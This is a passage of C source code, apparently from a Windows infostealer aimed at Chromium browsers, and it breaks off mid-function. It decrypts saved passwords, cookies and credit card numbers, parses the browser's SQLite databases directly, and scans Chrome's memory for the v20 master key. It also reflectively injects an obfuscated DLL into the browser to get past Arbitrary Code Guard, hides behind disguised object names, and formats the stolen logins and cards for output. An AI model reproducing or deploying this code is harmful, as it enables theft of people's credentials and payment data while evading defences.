static int _decrypt_gcm_blob(const uint8_t *key, const uint8_t *blob,
                               size_t blob_len, char *out, size_t outsz,
                               int is_cookie)
{
    if (blob_len < 3 + 12 + 16) return -1;
    const uint8_t *nonce = blob + 3;
    const uint8_t *ct    = blob + 3 + 12;
    size_t ct_len        = blob_len - 3 - 12 - 16;
    const uint8_t *tag   = blob + blob_len - 16;

    if (ct_len == 0) { out[0] = 0; return 0; }

    uint8_t *pt = (uint8_t*)malloc(ct_len + 1);
    if (!pt) return -1;
    int r = _aes_gcm_dec(key, nonce, 12, ct, ct_len, tag, pt);
    if (r == 0) {
        pt[ct_len] = 0;
        size_t skip = 0;
        /* Chrome 130+ prepends 32-byte key-commitment to cookie plaintext.
         * Detect: first 32 bytes contain non-printable byte(s). */
        if (is_cookie && ct_len > 32) {
            for (size_t i = 0; i < 32; i++) {
                if (pt[i] < 0x20 || pt[i] > 0x7e) { skip = 32; break; }
            }
        }
        snprintf(out, outsz, "%.*s", (int)(ct_len - skip), (char*)pt + skip);
    }
    SecureZeroMemory(pt, ct_len);
    free(pt);
    return r;
}

static int _decrypt_pw(const uint8_t *mk,    int have_mk,
                       const uint8_t *v20mk, int have_v20mk,
                       const uint8_t *blob,  size_t blob_len,
                       char *out, size_t outsz, int is_cookie)
{
    if (!blob || blob_len == 0) return -1;

    if (blob_len > 3 && (memcmp(blob, "v10", 3) == 0 || memcmp(blob, "v11", 3) == 0)) {
        if (!have_mk) return -1;
        return _decrypt_gcm_blob(mk, blob, blob_len, out, outsz, is_cookie);
    }

    if (blob_len > 3 && memcmp(blob, "v20", 3) == 0) {
        if (!have_v20mk) return -1;
        return _decrypt_gcm_blob(v20mk, blob, blob_len, out, outsz, is_cookie);
    }

    /* legacy: DPAPI-encrypted blob (pre-Chrome 80) */
    uint8_t *dec = NULL; size_t dec_len = 0;
    if (_dpapi_dec(blob, blob_len, &dec, &dec_len) != 0) return -1;
    snprintf(out, outsz, "%.*s", (int)dec_len, (char*)dec);
    SecureZeroMemory(dec, dec_len); free(dec);
    return 0;
}

/* ── minimal SQLite B-tree reader ────────────────────────────────────── */

typedef struct
{
    const uint8_t *data;
    size_t size;
    uint32_t page_size;
} _sq_db_t;

static const uint8_t *_sq_page(const _sq_db_t *db, uint32_t pgno)
{
    if (pgno == 0)
        return NULL;
    uint64_t off = (uint64_t)(pgno - 1) * db->page_size;
    if (off + db->page_size > db->size)
        return NULL;
    return db->data + (size_t)off;
}

#define SQ_MAX_COLS 32

typedef struct
{
    uint64_t type[SQ_MAX_COLS];
    const uint8_t *val[SQ_MAX_COLS];
    uint32_t len[SQ_MAX_COLS];
    int n;
} _sq_row_t;

typedef void (*_sq_cb)(void *, const _sq_row_t *);

/* parse one leaf page and call cb for each record */
static void _sq_leaf(const _sq_db_t *db,
                     const uint8_t *page, int is_p1,
                     _sq_cb cb, void *cbctx)
{
    int hdr_off = is_p1 ? 100 : 0;
    const uint8_t *h = page + hdr_off;
    if (h[0] != 0x0D)
        return; /* must be leaf table page */

    uint16_t n_cells = _be16(h + 3);
    const uint8_t *arr = h + 8;
    const uint8_t *pend = page + db->page_size;

    for (uint16_t i = 0; i < n_cells; i++)
    {
        if (arr + i * 2 + 1 >= pend)
            break;
        uint16_t off = _be16(arr + i * 2);
        if (off < (uint16_t)hdr_off || off + 2 >= db->page_size)
            continue;
        const uint8_t *c = page + off;

        uint64_t payload_len = 0, rowid = 0;
        int n = _sq_varint(c, pend, &payload_len);
        if (n <= 0)
            continue;
        c += n;
        n = _sq_varint(c, pend, &rowid);
        if (n <= 0)
            continue;
        c += n;

        /* inline payload (no overflow pages for Login Data rows) */
        const uint8_t *payload = c;
        if (payload + payload_len > pend)
            continue;

        uint64_t hdr_sz = 0;
        n = _sq_varint(payload, payload + payload_len, &hdr_sz);
        if (n <= 0 || hdr_sz > payload_len || hdr_sz < (uint64_t)n)
            continue;

        const uint8_t *tp = payload + n;
        const uint8_t *hend = payload + hdr_sz;
        const uint8_t *vp = payload + hdr_sz;

        _sq_row_t row;
        row.n = 0;

        while (tp < hend && row.n < SQ_MAX_COLS)
        {
            uint64_t t = 0;
            n = _sq_varint(tp, hend, &t);
            if (n <= 0)
                break;
            tp += n;
            uint32_t vlen = _sq_slen(t);
            if (vp + vlen > payload + payload_len)
                break;
            row.type[row.n] = t;
            row.val[row.n] = vp;
            row.len[row.n] = vlen;
            row.n++;
            vp += vlen;
        }

        if (row.n > 0)
            cb(cbctx, &row);
    }
}

/* recursive B-tree walk */
static void _sq_walk(const _sq_db_t *db, uint32_t pgno, int depth,
                     _sq_cb cb, void *cbctx)
{
    if (depth > 20)
        return;
    const uint8_t *page = _sq_page(db, pgno);
    if (!page)
        return;

    int is_p1 = (pgno == 1);
    int hdr_off = is_p1 ? 100 : 0;
    const uint8_t *h = page + hdr_off;

    if (h[0] == 0x05)
    {
        /* interior page: walk left children then right-most */
        uint16_t n_cells = _be16(h + 3);
        uint32_t right = _be32(h + 8);
        const uint8_t *arr = h + 12;
        const uint8_t *pend = page + db->page_size;

        for (uint16_t i = 0; i < n_cells; i++)
        {
            if (arr + i * 2 + 1 >= pend)
                break;
            uint16_t coff = _be16(arr + i * 2);
            if (coff < (uint16_t)hdr_off + 4 || coff >= db->page_size)
                continue;
            uint32_t child = _be32(page + coff);
            _sq_walk(db, child, depth + 1, cb, cbctx);
        }
        _sq_walk(db, right, depth + 1, cb, cbctx);
    }
    else if (h[0] == 0x0D)
    {
        _sq_leaf(db, page, is_p1, cb, cbctx);
    }
}

/* ── sqlite_master scan to find logins rootpage ──────────────────────── */

typedef struct
{
    const char *tbl;
    uint32_t rootpage;
} _sq_find_t;

static void _sq_find_cb(void *ctx_, const _sq_row_t *row)
{
    _sq_find_t *f = (_sq_find_t *)ctx_;
    if (f->rootpage)
        return;
    if (row->n < 4)
        return;

    /* col 0: type TEXT must be "table" */
    if (!(row->type[0] >= 13 && (row->type[0] & 1)))
        return;
    if (row->len[0] != 5 || memcmp(row->val[0], "table", 5) != 0)
        return;

    /* col 1: name TEXT must match */
    if (!(row->type[1] >= 13 && (row->type[1] & 1)))
        return;
    size_t nlen = strlen(f->tbl);
    if (row->len[1] != (uint32_t)nlen ||
        memcmp(row->val[1], f->tbl, nlen) != 0)
        return;

    /* col 3: rootpage INTEGER */
    uint64_t t = row->type[3];
    if (t < 1 || t > 9)
        return;
    uint32_t rp = 0;
    uint32_t vlen = row->len[3];
    for (uint32_t i = 0; i < vlen; i++)
        rp = (rp << 8) | row->val[3][i];
    f->rootpage = rp;
}

/* ── Chrome memory scan for v20 AES master key ───────────────────────── */

typedef struct {
    int      found;
    uint8_t  nonce[12];
    uint8_t  ct[512];
    size_t   ct_len;
    uint8_t  tag[16];
} _v20_hint_t;

/* collect first v20 blob we find — used as oracle for memory scan */
static void _v20_hint_cb(void *ctx_, const _sq_row_t *row)
{
    _v20_hint_t *h = (_v20_hint_t *)ctx_;
    if (h->found || row->n < 6) return;
    if (row->len[5] < 3 + 12 + 1 + 16) return;
    if (memcmp(row->val[5], "v20", 3) != 0) return;
    size_t ct_len = row->len[5] - 3 - 12 - 16;
    if (ct_len == 0 || ct_len > sizeof(h->ct)) return;
    memcpy(h->nonce, row->val[5] + 3,           12);
    memcpy(h->ct,    row->val[5] + 3 + 12,      ct_len);
    memcpy(h->tag,   row->val[5] + row->len[5] - 16, 16);
    h->ct_len = ct_len;
    h->found  = 1;
}

static int _is_sqlite3(const void *data, size_t sz) {
    if (sz < 100) return 0;
    char m[16]; _evs_dec(m, EVS_str_sqlite_magic, 16);
    int ok = (memcmp(data, m, 16) == 0);
    SecureZeroMemory(m, 16);
    return ok;
}

/* extract one v20 blob from Login Data for use as key-search oracle */
static int _extract_v20_hint(const char *db_path, _v20_hint_t *hint)
{
    char tmp[MAX_PATH] = {0};
    if (_copy_to_temp(db_path, tmp, sizeof(tmp)) != 0) return -1;

    size_t db_sz = 0;
    uint8_t *db_data = _read_file(tmp, &db_sz);
    DeleteFileA(tmp);
    if (!db_data) return -1;

    if (!_is_sqlite3(db_data, db_sz)) {
        free(db_data); return -1;
    }

    _sq_db_t db;
    db.data = db_data; db.size = db_sz;
    uint16_t pgsz = _be16(db_data + 16);
    db.page_size = (pgsz == 1) ? 65536u : (uint32_t)pgsz;
    if (db.page_size < 512 || db.page_size > 65536) { free(db_data); return -1; }

    _sq_find_t find = {"logins", 0};
    _sq_walk(&db, 1, 0, _sq_find_cb, &find);
    if (find.rootpage) {
        hint->found = 0;
        _sq_walk(&db, find.rootpage, 0, _v20_hint_cb, hint);
    }
    free(db_data);
    return hint->found ? 0 : -1;
}

/*
 * Scan READWRITE pages of all matching browser processes for a 32-byte AES-256 key.
 * Use a known (nonce, ct, tag) triplet from a v20 blob as oracle:
 * try each 16-byte-aligned candidate key, accept on GCM tag match.
 */
/*
 * Scan a SINGLE browser process (by PID) for the plaintext v20 key.
 * Chrome 127-129 only: on Chrome 130+, BCryptProtectMemory encrypts the key
 * in-process so ReadProcessMemory returns ciphertext — scan always fails.
 * Cap at 512 MB to avoid hour-long scans on memory-heavy browser processes.
 */
static int _scan_chrome_pid(const _v20_hint_t *hint, DWORD pid,
                             uint8_t key_out[32])
{
    if (!hint->found || hint->ct_len == 0 || !pid) return -1;

    HANDLE hp = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION,
                            FALSE, pid);
    if (!hp) return -1;

    MEMORY_BASIC_INFORMATION mbi;
    uint8_t *addr = NULL;
    uint8_t *rbuf = NULL;
    size_t   rcap = 0;
    uint8_t  pt[512];
    int      found = -1;
    size_t   total = 0;

    while (VirtualQueryEx(hp, addr, &mbi, sizeof(mbi)) == sizeof(mbi)) {
        addr = (uint8_t *)mbi.BaseAddress + mbi.RegionSize;

        if (mbi.State != MEM_COMMIT) continue;
        if (!(mbi.Protect & (PAGE_READWRITE | PAGE_EXECUTE_READWRITE))) continue;
        if (mbi.RegionSize < 32 || mbi.RegionSize > 64 * 1024 * 1024) continue;

        total += mbi.RegionSize;
        if (total > 512 * 1024 * 1024) break;

        if (mbi.RegionSize > rcap) {
            free(rbuf);
            rbuf = (uint8_t *)malloc(mbi.RegionSize);
            rcap = rbuf ? mbi.RegionSize : 0;
        }
        if (!rbuf) continue;

        SIZE_T rd = 0;
        if (!ReadProcessMemory(hp, mbi.BaseAddress, rbuf, mbi.RegionSize, &rd)) continue;
        if (rd < 32) continue;

        for (size_t off = 0; off + 32 <= rd; off += 8) {
            if (_aes_gcm_dec(rbuf + off,
                             hint->nonce, 12,
                             hint->ct, hint->ct_len,
                             hint->tag, pt) == 0) {
                memcpy(key_out, rbuf + off, 32);
                found = 0;
                goto scan_done;
            }
        }
    }

scan_done:
    free(rbuf);
    CloseHandle(hp);
    return found;
}

/* ── browser process finder (used by injection + handle-dup fallback) ─── */

/*
 * Find the main browser process by name.
 * Primary heuristic: browser process = proc_name whose PARENT is NOT proc_name.
 *   (renderers/GPU/utility are all spawned by the browser process itself)
 * Fallback (multiple candidates or all have same-name parent): largest RW footprint.
 */
static DWORD _find_browser_pid(const char *proc_name)
{
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;

    /* build set of all matching PIDs and their parent PIDs */
    #define _MAX_PROCS 256
    DWORD  pids[_MAX_PROCS]; DWORD ppids[_MAX_PROCS]; int np = 0;
    /* also collect full set of matching PIDs to check parentage */
    DWORD  all_match[_MAX_PROCS]; int nm = 0;

    PROCESSENTRY32 pe; pe.dwSize = sizeof(pe);
    if (Process32First(snap, &pe)) do {
        if (_stricmp(pe.szExeFile, proc_name) != 0) continue;
        if (nm < _MAX_PROCS) all_match[nm++] = pe.th32ProcessID;
        if (np < _MAX_PROCS) {
            pids[np]  = pe.th32ProcessID;
            ppids[np] = pe.th32ParentProcessID;
            np++;
        }
    } while (Process32Next(snap, &pe));
    CloseHandle(snap);

    if (np == 0) return 0;
    if (np == 1) return pids[0];

    /* find entries whose parent is NOT in the matching set */
    DWORD browser_pids[_MAX_PROCS]; int nbr = 0;
    for (int i = 0; i < np; i++) {
        int parent_is_match = 0;
        for (int j = 0; j < nm; j++) {
            if (all_match[j] == ppids[i]) { parent_is_match = 1; break; }
        }
        if (!parent_is_match && nbr < _MAX_PROCS)
            browser_pids[nbr++] = pids[i];
    }

    if (nbr == 1) return browser_pids[0];

    /* ambiguous or all have same-name parent — fall back to largest RW footprint */
    DWORD *cands = (nbr > 0) ? browser_pids : pids;
    int   ncands = (nbr > 0) ? nbr           : np;

    DWORD best_pid = 0; SIZE_T best_bytes = 0;
    for (int i = 0; i < ncands; i++) {
        HANDLE hp = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
                                FALSE, cands[i]);
        if (!hp) continue;
        SIZE_T total = 0;
        MEMORY_BASIC_INFORMATION mbi;
        uint8_t *addr = NULL;
        while (VirtualQueryEx(hp, addr, &mbi, sizeof(mbi)) == sizeof(mbi)) {
            addr = (uint8_t *)mbi.BaseAddress + mbi.RegionSize;
            if (mbi.State == MEM_COMMIT && (mbi.Protect & PAGE_READWRITE))
                total += mbi.RegionSize;
        }
        CloseHandle(hp);
        if (total > best_bytes) { best_bytes = total; best_pid = cands[i]; }
    }
    return best_pid;
    #undef _MAX_PROCS
}

/* ── Chrome injection fallback (Chrome 130+, BCrypt-protected key) ────── */
/*
 * When Chrome 130+ protects the AES key with BCryptProtectMemory
 * (SAME_PROCESS), ReadProcessMemory reads the encrypted form and the
 * external memory scan fails.  Solution: inject a helper DLL into the
 * Chrome BROWSER process (which has no ACG and no CIG on Chrome 150) so
 * BCryptUnprotectMemory can run from inside the correct security context.
 *
 * Requires HAVE_CHROME_INJECT (built by `make chrome-helper`).
 */
#ifdef HAVE_CHROME_INJECT

/* Shared memory layout — must match chrome_key_helper.c exactly */
#define _CHROME_SHM_MAGIC 0xCEC0FFEE
#pragma pack(push, 1)
typedef struct {
    uint32_t magic;
    uint8_t  nonce[12];
    uint8_t  ct[512];
    uint32_t ct_len;
    uint8_t  tag[16];
    volatile int   found;
    uint8_t        key[32];
    volatile int32_t dbg_pages;
    volatile int32_t dbg_unprotect_ok;
    volatile int32_t dbg_gcm_tried;
    volatile int32_t dbg_bcrypt_ok;
    volatile int32_t dbg_scan_started;
    volatile int32_t dbg_dll_main;   /* set by DllMain — confirms DLL mapped+called */
    volatile uint8_t dbg_rl_step;   /* written by RL: 1=k32,2=exp,3=own,4=map */
} _chrome_shm_t;
#pragma pack(pop)

/*
 * Reflective injection of chrome_key_helper into the Chrome browser process.
 * Raw PE blob written to remote memory; ReflectiveLoader called as thread —
 * no file written to disk, no LoadLibraryA in remote IAT.
 * Fills key_out[32] and dbg_out on success, returns 0; -1 on failure.
 */

/* Convert RVA to file offset in a raw (file-layout) PE blob */
static DWORD _rva_to_fo(const uint8_t *blob, DWORD rva)
{
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)blob;
    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)(blob + dos->e_lfanew);
    PIMAGE_SECTION_HEADER s = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, s++) {
        if (rva >= s->VirtualAddress &&
            rva <  s->VirtualAddress + s->Misc.VirtualSize)
            return s->PointerToRawData + (rva - s->VirtualAddress);
    }
    return rva; /* header area: RVA == file offset */
}

/* Return file offset of ReflectiveLoader export, or 0 if not found */
static DWORD _find_rl_fo(const uint8_t *blob, size_t blob_len)
{
    if (blob_len < sizeof(IMAGE_DOS_HEADER)) return 0;
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)blob;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return 0;
    if ((size_t)dos->e_lfanew + sizeof(IMAGE_NT_HEADERS) > blob_len) return 0;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(blob + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return 0;

    DWORD exp_rva = nt->OptionalHeader
        .DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (!exp_rva) return 0;
    DWORD exp_fo = _rva_to_fo(blob, exp_rva);
    if (exp_fo + sizeof(IMAGE_EXPORT_DIRECTORY) > blob_len) return 0;

    PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)(blob + exp_fo);
    DWORD *names = (DWORD *)(blob + _rva_to_fo(blob, exp->AddressOfNames));
    WORD  *ords  = (WORD  *)(blob + _rva_to_fo(blob, exp->AddressOfNameOrdinals));
    DWORD *funcs = (DWORD *)(blob + _rva_to_fo(blob, exp->AddressOfFunctions));

    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        DWORD name_fo = _rva_to_fo(blob, names[i]);
        if (name_fo >= blob_len) continue;
        if (strcmp((const char *)(blob + name_fo), "DllGetClassObject") == 0)
            return _rva_to_fo(blob, funcs[ords[i]]);
    }
    return 0;
}

static int _inject_v20_chrome(DWORD chrome_pid, const _v20_hint_t *hint,
                               uint8_t key_out[32],
                               char *dbg_out, size_t dbg_sz)
{
    char step[512] = {0};
    int  ok        = -1;    /* declared here so goto cleanup_nomap paths are safe */
    snprintf(step, sizeof(step), "pid=%lu", (unsigned long)chrome_pid);

#define _DBG(fmt, ...) do { \
    size_t _l = strlen(step); \
    snprintf(step + _l, sizeof(step) - _l, " " fmt, ##__VA_ARGS__); \
} while(0)

    char shm_name[64], evt_name[64];
    snprintf(shm_name, sizeof(shm_name), "SHLW32Perf_%lu_Data",
             (unsigned long)chrome_pid);
    snprintf(evt_name, sizeof(evt_name), "SHLW32Perf_%lu_Sync",
             (unsigned long)chrome_pid);

    /* shared memory */
    HANDLE hMap = CreateFileMappingA(INVALID_HANDLE_VALUE, NULL,
                                      PAGE_READWRITE, 0,
                                      sizeof(_chrome_shm_t), shm_name);
    if (!hMap) { _DBG("shm=FAIL(%lu)", GetLastError()); goto cleanup_nomap; }

    _chrome_shm_t *shm = (_chrome_shm_t *)MapViewOfFile(
        hMap, FILE_MAP_ALL_ACCESS, 0, 0, 0);
    if (!shm) { _DBG("map=FAIL"); CloseHandle(hMap); goto cleanup_nomap; }

    memset(shm, 0, sizeof(*shm));
    shm->magic = _CHROME_SHM_MAGIC;
    memcpy(shm->nonce, hint->nonce, 12);
    memcpy(shm->ct,    hint->ct, hint->ct_len);
    shm->ct_len = (uint32_t)hint->ct_len;
    memcpy(shm->tag,   hint->tag, 16);

    HANDLE hEvt = CreateEventA(NULL, FALSE, FALSE, evt_name);
    if (!hEvt) {
        _DBG("evt=FAIL(%lu)", GetLastError());
        UnmapViewOfFile(shm); CloseHandle(hMap); goto cleanup_nomap;
    }

    /* decrypt XOR'd blob into local heap buffer */
    unsigned char *ckh_buf = _ckh_decrypt();
    if (!ckh_buf) { _DBG("ckh_decrypt=OOM"); goto cleanup; }

    /* locate loader entry in blob (file-offset, not RVA) */
    DWORD rl_fo = _find_rl_fo(ckh_buf, chrome_key_helper_dll_len);
    if (!rl_fo) { HeapFree(GetProcessHeap(), 0, ckh_buf); _DBG("rl=NOTFOUND"); goto cleanup; }
    _DBG("rl=0x%lx", (unsigned long)rl_fo);

    /* parse blob to get mapped image dimensions for pre-allocation */
    PIMAGE_DOS_HEADER blob_dos = (PIMAGE_DOS_HEADER)ckh_buf;
    PIMAGE_NT_HEADERS blob_nt  = (PIMAGE_NT_HEADERS)(ckh_buf + blob_dos->e_lfanew);
    DWORD img_sz = blob_nt->OptionalHeader.SizeOfImage;

    /* open browser process with minimum required rights */
    HANDLE hp = OpenProcess(
        PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION |
        PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION,
        FALSE, chrome_pid);
    if (!hp) { HeapFree(GetProcessHeap(), 0, ckh_buf); _DBG("open=FAIL(%lu)", GetLastError()); goto cleanup; }
    _DBG("open=OK");

    /*
     * Pre-allocate the mapped image from OUTSIDE Chrome — bypasses ACG
     * (Arbitrary Code Guard) which blocks VirtualAlloc(PAGE_EXECUTE_*)
     * from within Chrome's own threads on Chrome 130+.
     * Pass the base address as lpParam so the RL skips its own VirtualAlloc.
     */
    LPVOID remote_img = VirtualAllocEx(hp,
        (LPVOID)(ULONG_PTR)blob_nt->OptionalHeader.ImageBase,
        img_sz, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remote_img)
        remote_img = VirtualAllocEx(hp, NULL, img_sz,
                                     MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remote_img) {
        _DBG("valloc2=FAIL(%lu)", GetLastError());
        HeapFree(GetProcessHeap(), 0, ckh_buf);
        CloseHandle(hp); goto cleanup;
    }
    _DBG("imgbase=0x%llx", (unsigned long long)(ULONG_PTR)remote_img);

    /* write decrypted blob into Chrome — no file on disk */
    LPVOID remote_blob = VirtualAllocEx(hp, NULL, chrome_key_helper_dll_len,
                                         MEM_COMMIT | MEM_RESERVE,
                                         PAGE_EXECUTE_READWRITE);
    if (!remote_blob) {
        _DBG("valloc=FAIL(%lu)", GetLastError());
        HeapFree(GetProcessHeap(), 0, ckh_buf);
        VirtualFreeEx(hp, remote_img, 0, MEM_RELEASE);
        CloseHandle(hp); goto cleanup;
    }
    _DBG("valloc=OK");

    SIZE_T nw = 0;
    if (!WriteProcessMemory(hp, remote_blob, ckh_buf,
                            chrome_key_helper_dll_len, &nw) ||
        nw != chrome_key_helper_dll_len) {
        _DBG("wpm=FAIL(%lu)", GetLastError());
        HeapFree(GetProcessHeap(), 0, ckh_buf);
        VirtualFreeEx(hp, remote_blob, 0, MEM_RELEASE);
        VirtualFreeEx(hp, remote_img, 0, MEM_RELEASE);
        CloseHandle(hp); goto cleanup;
    }
    HeapFree(GetProcessHeap(), 0, ckh_buf); /* blob written, no longer needed */
    _DBG("wpm=OK");

    /*
     * Launch ReflectiveLoader — maps raw blob into remote_img (pre-allocated),
     * resolves imports, calls DllMain → creates scan thread, then exits.
     * lpParam = remote_img tells RL to use this base instead of VirtualAlloc.
     */
    LPTHREAD_START_ROUTINE pRL =
        (LPTHREAD_START_ROUTINE)((uint8_t *)remote_blob + rl_fo);
    HANDLE ht = inject_nt_create_thread_ex(hp, (PVOID)pRL, (PVOID)remote_img);
    if (!ht) {
        _DBG("crt=FAIL(%lu)", GetLastError());
        VirtualFreeEx(hp, remote_blob, 0, MEM_RELEASE);
        VirtualFreeEx(hp, remote_img, 0, MEM_RELEASE);
        CloseHandle(hp); goto cleanup;
    }
    _DBG("crt=OK");

    /* wait for RL to finish mapping then free the raw blob */
    WaitForSingleObject(ht, 5000);
    DWORD rl_exit = STILL_ACTIVE;
    GetExitCodeThread(ht, &rl_exit);
    _DBG("rl_exit=0x%lx", (unsigned long)rl_exit);
    /* Read step counter written by RL to remote_img[1] before PE copy.
     * 0x01=k32_fail 0x02=exp_fail 0x03=own_fail 0x5A=PE_copied(success path) */
    {
        uint8_t rl_step = 0;
        SIZE_T _rb = 0;
        ReadProcessMemory(hp, (uint8_t *)remote_img + 1, &rl_step, 1, &_rb);
        _DBG("rl_step=0x%02x", (unsigned)rl_step);
    }
    CloseHandle(ht);
    VirtualFreeEx(hp, remote_blob, 0, MEM_RELEASE);
    /* remote_img stays alive — scan thread executes from there */

    /* wait up to 20s for scan thread to signal key found */
    DWORD wres = WaitForSingleObject(hEvt, 20000);
    _DBG("wait=%s dll=%ld scan=%ld bcrypt=%ld pages=%ld unp=%ld gcm=%ld found=%d rl_shm=%d",
         wres == WAIT_OBJECT_0 ? "EVT" : "TIMEOUT",
         (long)shm->dbg_dll_main,
         (long)shm->dbg_scan_started,
         (long)shm->dbg_bcrypt_ok,
         (long)shm->dbg_pages,
         (long)shm->dbg_unprotect_ok,
         (long)shm->dbg_gcm_tried,
         shm->found,
         (int)shm->dbg_rl_step);

    if (wres == WAIT_OBJECT_0 && shm->found) {
        memcpy(key_out, (const uint8_t *)shm->key, 32);
        ok = 0;
    }
    CloseHandle(hp);

cleanup:
    SecureZeroMemory(shm, sizeof(*shm));
    UnmapViewOfFile(shm);
    CloseHandle(hMap);
    CloseHandle(hEvt);
cleanup_nomap:
    if (dbg_out && dbg_sz > 0)
        snprintf(dbg_out, dbg_sz, "%s", step);
    return ok;

#undef _DBG
}

#endif /* HAVE_CHROME_INJECT */

/* ── logins table row callback ───────────────────────────────────────── */

typedef struct
{
    const uint8_t *mk;
    int have_mk;
    const uint8_t *v20mk;
    int have_v20mk;
    char *out;
    size_t outsz;
    size_t *pos;
    const char *bname;
    const char *pname;
} _login_ctx_t;

static void _login_cb(void *ctx_, const _sq_row_t *row)
{
    _login_ctx_t *ctx = (_login_ctx_t *)ctx_;
    if (row->n < 6)
        return;
    if (*ctx->pos + 256 >= ctx->outsz)
        return;

    /* col 0: origin_url TEXT */
    if (!(row->type[0] >= 13 && (row->type[0] & 1)))
        return;
    char url[512] = {0};
    size_t ulen = row->len[0] < sizeof(url) - 1 ? row->len[0] : sizeof(url) - 1;
    memcpy(url, row->val[0], ulen);

    /* col 3: username_value TEXT (may be empty) */
    char user[256] = {0};
    if (row->type[3] >= 13 && (row->type[3] & 1) && row->len[3] > 0)
    {
        size_t uu = row->len[3] < sizeof(user) - 1 ? row->len[3] : sizeof(user) - 1;
        memcpy(user, row->val[3], uu);
    }

    /* col 5: password_value BLOB */
    char pass[1024] = {0};
    if (row->len[5] > 0) {
        if (_decrypt_pw(ctx->mk, ctx->have_mk,
                        ctx->v20mk, ctx->have_v20mk,
                        row->val[5], row->len[5],
                        pass, sizeof(pass), 0) != 0)
            strncpy(pass, "[encrypted - browser running needed]", sizeof(pass) - 1);
    }

    if (!url[0])
        return;

    int n = snprintf(ctx->out + *ctx->pos, ctx->outsz - *ctx->pos,
                     "[ %s / %s ]\n"
                     "  URL  : %s\n"
                     "  USER : %s\n"
                     "  PASS : %s\n\n",
                     ctx->bname, ctx->pname, url, user, pass);
    if (n > 0)
        *ctx->pos += (size_t)n;

    SecureZeroMemory(pass, sizeof(pass));
}

/* credit_cards table row callback */

static int64_t _sq_col_int(const _sq_row_t *row, int col)
{
    uint64_t t = row->type[col];
    if (t == 8) return 0;
    if (t == 9) return 1;
    if (t < 1 || t > 6) return 0;
    uint32_t vlen = row->len[col];
    int64_t v = 0;
    for (uint32_t i = 0; i < vlen; i++)
        v = (v << 8) | row->val[col][i];
    if (vlen > 0 && vlen < 8) {
        int shift = (int)(8 - vlen) * 8;
        v = (v << shift) >> shift;
    }
    return v;
}

static void _ccard_cb(void *ctx_, const _sq_row_t *row)
{
    _login_ctx_t *ctx = (_login_ctx_t *)ctx_;
    if (row->n < 5) return;
    if (*ctx->pos + 256 >= ctx->outsz) return;

    /* col 1: name_on_card TEXT */
    char name[128] = {0};
    if (row->type[1] >= 13 && (row->type[1] & 1) && row->len[1] > 0) {
        size_t nl = row->len[1] < sizeof(name) - 1 ? row->len[1] : sizeof(name) - 1;
        memcpy(name, row->val[1], nl);
    }

    /* col 2: expiration_month INTEGER */
    int64_t month = (row->type[2] >= 1 && row->type[2] <= 9) ? _sq_col_int(row, 2) : 0;

    /* col 3: expiration_year INTEGER */
    int64_t year = (row->type[3] >= 1 && row->type[3] <= 9) ? _sq_col_int(row, 3) : 0;

    /* col 4: card_number_encrypted BLOB */
    char num[32] = {0};
    if (row->len[4] > 0)
        _decrypt_pw(ctx->mk, ctx->have_mk,
                    ctx->v20mk, ctx->have_v20mk,
                    row->val[4], row->len[4],
                    num, sizeof(num), 0);

    if (!num[0]) return;

    int n = snprintf(ctx->out + *ctx->pos, ctx->outsz - *ctx->pos,
                     "[ %s / %s \xe2\x80\x94 Card ]\n"
                     "  NAME : %s\n"
                     "  NUM  : %s\n"
                     "  EXP  : %02lld/%04lld\n\n",
                     ctx->bname, ctx->pname,
                     name[0] ? name : "(unknown)",
                     num,
                     (long long)month, (long long)year);
    if (n > 0) *ctx->pos += (size_t)n;

    SecureZeroMemory(num, sizeof(num));
}

/* ── per-profile dump ────────────────────────────────────────────────── */

static void _dump_profile(const char *bname, const char *pname,
                          const uint8_t *mk, int have_mk,
                          const uint8_t *v20mk, int have_v20mk,
                          const char *db_path,
                          char *out, size_t outsz, size_t *pos)
{
    char tmp[MAX_PATH] = {0};
    if (_copy_to_temp(db_path, tmp, sizeof(tmp)) != 0)
        return;

    size_t db_sz = 0;
    uint8_t *db_data = _read_file(tmp, &db_sz);
    DeleteFileA(tmp);
    if (!db_data)
        return;

    _apply_wal(&db_data, &db_sz, db_path);

    /* SQLite magic */
    if (!_is_sqlite3(db_data, db_sz))
    {
        free(db_data);
        return;
    }

    _sq_db_t db;
    db.data = db_data;
    db.size = db_sz;
    uint16_t pgsz = _be16(db_data + 16);
    db.page_size = (pgsz == 1) ? 65536u : (uint32_t)pgsz;
    if (db.page_size < 512 || db.page_size > 65536)
    {
        free(db_data);
        return;
    }

    /* find logins table */
    _sq_find_t find = {"logins", 0};
    _sq_walk(&db, 1, 0, _sq_find_cb, &find);
    if (find.rootpage == 0)
    {
        free(db_data);
        return;
    }

    _login_ctx_t lctx = {
        .mk = mk,
        .have_mk = have_mk,
        .v20mk = v20mk,
        .have_v20mk = have_v20mk,
        .out = out,
        .outsz = outsz,
        .pos = pos,
        .bname = bname,
        .pname = pname,
    };
    _sq_walk(&db, find.rootpage, 0, _login_cb, &lctx);
    free(db_data);
}

static void _dump_cc_profile(const char *bname, const char *pname,
                              const uint8_t *mk, int have_mk,
                              const uint8_t *v20mk, int have_v20mk,
                              const char *db_path,
                              char *out, size_t outsz, size_t *pos)
{
    char tmp[MAX_PATH] = {0};
